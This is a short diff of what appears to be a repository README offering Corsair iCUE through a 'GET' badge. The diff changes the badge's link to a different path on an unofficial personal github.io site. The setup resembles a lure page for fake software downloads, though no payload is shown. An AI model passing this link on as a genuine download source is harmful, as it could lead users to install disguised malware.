@@ -4,7 +4,7 @@
 <img src="https://image1280.macovi.de/images/product_images/1280/1600216_0__9200529.jpg" width="300">
 </p>
 
-[![GET — CORSAIR ICUE](https://img.shields.io/badge/GET-CORSAIR%20ICUE-2563eb?style=for-the-badge)](https://r30575269.github.io/.github/)
+[![GET — CORSAIR ICUE](https://img.shields.io/badge/GET-CORSAIR%20ICUE-2563eb?style=for-the-badge)](https://r30575269.github.io/.github/Corsair-iCUE)
 
 ---
 
